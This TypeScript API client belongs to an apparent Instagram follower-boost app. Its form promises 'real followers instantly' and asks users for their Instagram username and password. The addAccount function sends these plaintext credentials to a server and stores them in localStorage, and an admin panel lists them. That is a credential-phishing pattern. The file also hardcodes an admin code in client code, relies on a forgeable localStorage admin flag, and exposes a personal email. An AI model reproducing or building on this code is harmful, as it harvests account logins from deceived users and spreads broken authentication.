import { AppSettings, InstagramAccount, AccountStatus } from '../types';

export const USER_EMAIL = 'jiteshprajapati18392@gmail.com';

const DEFAULT_SETTINGS: AppSettings = {
  admin_code: '805040',
  app_title: 'Grow Your Instagram',
  app_subtitle: 'Get real followers instantly ✨',
  form_title: 'Add Instagram Account',
  form_subtitle: 'अपना Instagram अकाउंट जोड़ें',
  coins_default: 500,
};

const LOCAL_STORAGE_SETTINGS_KEY = 'instaboost_settings_v1';
const LOCAL_STORAGE_ACCOUNTS_KEY = 'instaboost_accounts_v1';
const LOCAL_STORAGE_COINS_KEY = 'instaboost_user_coins_v1';
const LOCAL_STORAGE_ADMIN_AUTH_KEY = 'instaboost_admin_authenticated_v1';

// Initial mock accounts if localStorage is empty
const INITIAL_LOCAL_ACCOUNTS: InstagramAccount[] = [
  {
    id: 'acc_demo_1',
    username: 'rohit_sharma_official',
    password: 'password_sample_982',
    followers_requested: 1000,
    status: 'completed',
    created_by: USER_EMAIL,
    created_at: new Date(Date.now() - 3600000 * 24).toISOString(),
  },
  {
    id: 'acc_demo_2',
    username: 'priya.creatives',
    password: 'priya_secure_pass1!',
    followers_requested: 500,
    status: 'processing',
    created_by: USER_EMAIL,
    created_at: new Date(Date.now() - 3600000 * 5).toISOString(),
  },
  {
    id: 'acc_demo_3',
    username: 'vikram_fit_life',
    password: 'vikram_fit#2026',
    followers_requested: 2500,
    status: 'pending',
    created_by: USER_EMAIL,
    created_at: new Date(Date.now() - 3600000 * 1).toISOString(),
  },
];

// Helper: load from localStorage
function getLocalSettings(): AppSettings {
  try {
    const raw = localStorage.getItem(LOCAL_STORAGE_SETTINGS_KEY);
    if (raw) return { ...DEFAULT_SETTINGS, ...JSON.parse(raw) };
  } catch (e) {
    console.warn('Error reading local settings:', e);
  }
  return DEFAULT_SETTINGS;
}

function saveLocalSettings(settings: AppSettings) {
  try {
    localStorage.setItem(LOCAL_STORAGE_SETTINGS_KEY, JSON.stringify(settings));
  } catch (e) {
    console.warn('Error saving local settings:', e);
  }
}

function getLocalAccounts(): InstagramAccount[] {
  try {
    const raw = localStorage.getItem(LOCAL_STORAGE_ACCOUNTS_KEY);
    if (raw) {
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed) && parsed.length > 0) return parsed;
    }
  } catch (e) {
    console.warn('Error reading local accounts:', e);
  }
  return INITIAL_LOCAL_ACCOUNTS;
}

function saveLocalAccounts(accounts: InstagramAccount[]) {
  try {
    localStorage.setItem(LOCAL_STORAGE_ACCOUNTS_KEY, JSON.stringify(accounts));
  } catch (e) {
    console.warn('Error saving local accounts:', e);
  }
}

export const api = {
  // --- Settings ---
  async getSettings(): Promise<AppSettings> {
    try {
      const res = await fetch('/api/settings');
      if (res.ok) {
        const json = await res.json();
        if (json.data) {
          saveLocalSettings(json.data);
          return json.data;
        }
      }
    } catch {
      // server offline or failed, fallback to localStorage
    }
    return getLocalSettings();
  },

  async updateSettings(settings: Partial<AppSettings>): Promise<AppSettings> {
    try {
      const res = await fetch('/api/settings', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(settings),
      });
      if (res.ok) {
        const json = await res.json();
        if (json.data) {
          saveLocalSettings(json.data);
          return json.data;
        }
      }
    } catch {
      // fallback
    }

    const current = getLocalSettings();
    const updated: AppSettings = { ...current, ...settings };
    saveLocalSettings(updated);
    return updated;
  },

  // --- Verify Admin Code ---
  async verifyAdminCode(code: string): Promise<boolean> {
    const cleanCode = code.trim();
    try {
      const res = await fetch('/api/verify-admin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ code: cleanCode }),
      });
      if (res.ok) {
        const json = await res.json();
        if (json.verified) {
          localStorage.setItem(LOCAL_STORAGE_ADMIN_AUTH_KEY, 'true');
          return true;
        }
      }
    } catch {
      // fallback to local check
    }

    const currentSettings = getLocalSettings();
    const verified = cleanCode === currentSettings.admin_code;
    if (verified) {
      localStorage.setItem(LOCAL_STORAGE_ADMIN_AUTH_KEY, 'true');
    }
    return verified;
  },

  isAdminAuthenticated(): boolean {
    return localStorage.getItem(LOCAL_STORAGE_ADMIN_AUTH_KEY) === 'true';
  },

  setAdminAuthenticated(auth: boolean) {
    if (auth) {
      localStorage.setItem(LOCAL_STORAGE_ADMIN_AUTH_KEY, 'true');
    } else {
      localStorage.removeItem(LOCAL_STORAGE_ADMIN_AUTH_KEY);
    }
  },

  // --- Instagram Accounts ---
  async getAccounts(): Promise<InstagramAccount[]> {
    try {
      const res = await fetch('/api/accounts');
      if (res.ok) {
        const json = await res.json();
        if (Array.isArray(json.data)) {
          saveLocalAccounts(json.data);
          return json.data;
        }
      }
    } catch {
      // fallback
    }
    return getLocalAccounts();
  },

  async addAccount(accountData: {
    username: string;
    password: string;
    followers_requested: number;
    created_by?: string;
  }): Promise<InstagramAccount> {
    const payload = {
      ...accountData,
      created_by: accountData.created_by || USER_EMAIL,
    };

    try {
      const res = await fetch('/api/accounts', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });
      if (res.ok) {
        const json = await res.json();
        if (json.data) {
          const accounts = getLocalAccounts();
          saveLocalAccounts([json.data, ...accounts]);
          return json.data;
        }
      }
    } catch {
      // fallback
    }

    const newAcc: InstagramAccount = {
      id: `acc_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
      username: accountData.username.replace(/^@+/, '').trim(),
      password: accountData.password.trim(),
      followers_requested: accountData.followers_requested,
      status: 'pending',
      created_by: accountData.created_by || USER_EMAIL,
      created_at: new Date().toISOString(),
    };

    const current = getLocalAccounts();
    saveLocalAccounts([newAcc, ...current]);
    return newAcc;
  },

  async updateAccountStatus(id: string, status: AccountStatus): Promise<boolean> {
    try {
      const res = await fetch(`/api/accounts/${id}`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ status }),
      });
      if (res.ok) {
        // sync local
        const accounts = getLocalAccounts().map((acc) =>
          acc.id === id ? { ...acc, status, updated_at: new Date().toISOString() } : acc
        );
        saveLocalAccounts(accounts);
        return true;
      }
    } catch {
      // fallback
    }

    const accounts = getLocalAccounts().map((acc) =>
      acc.id === id ? { ...acc, status, updated_at: new Date().toISOString() } : acc
    );
    saveLocalAccounts(accounts);
    return true;
  },

  async deleteAccount(id: string): Promise<boolean> {
    try {
      const res = await fetch(`/api/accounts/${id}`, {
        method: 'DELETE',
      });
      if (res.ok) {
        const accounts = getLocalAccounts().filter((acc) => acc.id !== id);
        saveLocalAccounts(accounts);
        return true;
      }
    } catch {
      // fallback
    }

    const accounts = getLocalAccounts().filter((acc) => acc.id !== id);
    saveLocalAccounts(accounts);
    return true;
  },

  // --- Coins Management ---
  getCoins(): number {
    try {
      const val = localStorage.getItem(LOCAL_STORAGE_COINS_KEY);
      if (val !== null) return parseInt(val, 10);
    } catch {
      // ignore
    }
    return 500;
  },

  setCoins(coins: number) {
    try {
      localStorage.setItem(LOCAL_STORAGE_COINS_KEY, String(Math.max(0, coins)));
    } catch (e) {
      console.warn('Error saving coins:', e);
    }
  },

  addCoins(amount: number): number {
    const current = this.getCoins();
    const updated = current + amount;
    this.setCoins(updated);
    return updated;
  },

  deductCoins(amount: number): boolean {
    const current = this.getCoins();
    if (current >= amount) {
      this.setCoins(current - amount);
      return true;
    }
    return false;
  },
};
